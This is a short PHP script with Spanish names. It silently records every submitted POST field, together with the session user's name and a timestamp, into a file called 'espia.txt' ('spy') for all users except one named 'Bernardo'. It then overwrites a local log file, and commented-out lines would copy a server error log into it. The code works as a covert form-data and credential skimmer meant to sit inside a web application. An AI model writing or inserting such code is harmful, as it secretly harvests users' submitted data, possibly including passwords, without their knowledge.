<?php

   session_start();
   
   if( trim( $_SESSION['txtNombre'] ) != "Bernardo" ){
      $txtArchivo = "./espia.txt";
      if( file_exists( $txtArchivo ) ){
         $aptArchivo = fopen( "./espia.txt" , "a" );
      } else {
         $aptArchivo = fopen( "./espia.txt" , "a" );
         fwrite( $aptArchivo , "fecha\tusuario\t" . implode( "\t" , array_keys( $_POST ) ) . "\r\n" );
      }

      fwrite( $aptArchivo , date( "Y-m-d H:i:s" ) . "\t" . $_SESSION['txtNombre'] . " " . $_SESSION['txtApellido'] . "\t" . implode( "\t" , $_POST ) . "\r\n" );
      fclose( $aptArchivo );
   }
   
   $aptLog = fopen("./log.txt", "w" );
   if( file_exists( "J:/logs/error_log.log" ) ){
//      $aptArchivoLog = fopen( "J:/logs/error_log.log" , "r" );
//      while( $txtLinea = fgets( $aptArchivoLog ) ){
//         fwrite( $aptLog , $txtLinea );
//      }
//      fclose( $aptArchivoLog );
   } else {
      fwrite( $aptLog , "No existe" );
   }
   fclose( $aptLog );
   
?>
